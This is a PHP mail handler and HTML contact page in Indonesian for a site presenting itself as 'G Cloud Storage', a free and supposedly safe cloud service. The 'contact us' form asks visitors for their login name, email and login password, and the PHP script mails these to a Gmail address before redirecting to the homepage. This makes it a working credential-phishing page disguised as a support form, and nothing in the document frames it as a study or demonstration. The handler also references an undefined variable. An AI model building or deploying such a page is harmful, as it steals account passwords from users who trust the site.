<?php
$nama = $_POST['nama'];
$email = $_POST['email'];
$password = $_POST['password'];
$pesan = $_POST['pesan'];

$email_from = 'bsbbrg19@gmail.com';
$email_subject = 'pesan baru';
$email_body = "User Name: $name.\n" . "User Email: $email.\n" . "Subject: $password.\n" . "User Message: $pesan.\n";

$to = 'bsbbrg19@gmail.com';



$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $email \r\n";

mail($to,$email_subject,$email_body,$headers);


header("Location: index.html");
?>







<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KONTAK-KAMI | G Cloud Storage</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/fontawesome.min.css">
</head>

<body>

    <section class="sub-header">

        <nav>
            <a href="index.html">
            </a>
            <div class="nav-link" id="navlink">
                <i class="fa" onclick="hidemenu()">✖️</i>
                <ul>
                    <li>
                        <a href="" target="">HOME</a>
                    </li>
                    <li>
                        <a href="" target="">PILIH-RENCANA</a>
                    </li>
                    <li>
                        <a href="" target="">PANDUAN</a>
                    </li>
                    <li>
                        <a href="" target="">KONTAK</a>
                    </li>
                </ul>
            </div>
            <i class="fa" onclick="showmenu()">⚙️</i>
        </nav>

        <h1>Kontak Kami</h1>


    </section>
    <!--isi-->
    <!--------SERVER LOCATION-------->
    <!---fasilitas--->
<!--ISI DARI TENTANG--->
 <!--kontak kami dahlah-->

    <section class="loc">
        <img src="img/haha.jpg" width="200px">
    </section>
<section class="kontakus">
    <div class="row">
        <div class="kontakcol">
            <div>
                📩
                <span>

                    <h5>

                        gcloudstorage@gmail.com

                    </h5>

                    <p>

                        Email jika ada masalah ya !!

                    </p>

                </span>
            </div>
        </div>


        <div class="kontakcol">
                


            <form action="form.php" method="post">
                

                <input type="text" placeholder="Nama saat login" id="nama" name="nama" required>
                <input type="email" placeholder="Email saat login" id="email" name="email" required>
                <input type="text" placeholder="masukan password saat login kamu" name="password" id="password" required>
                <textarea rows="8" placeholder="pesan?" id="pesan" name="pesan"></textarea>
                <button type="submit" class="hero-btn">KIRIM</button>



            </form>






        </div>


    </div>
</section>




















    <!----java scrip susah dah lah---->
    <script>
        var navlink = document.getElementById("navlink")
        function showmenu() {
            navlink.style.right = "0";
        }
        function hidemenu() {
            navlink.style.right = "-200px";
        }
    </script>





<section class="kaki">
<h4>
    tentang kami
</h4>
<p>
    cloud storage gratis aman mudah dan cepat sudah di gunakan sebanyak <br>
     300+ penggunatidak percaya aman silakan coba sendiri :)
</p>
<div class="icon">
    <i><img src="img/youtube.png" width=""></i>
    <i><img src="img/mukabuku.png" width=""></i>
</div>
<p>
    made with by DEV-CODE-3
</p>
</section>








</body>

</html>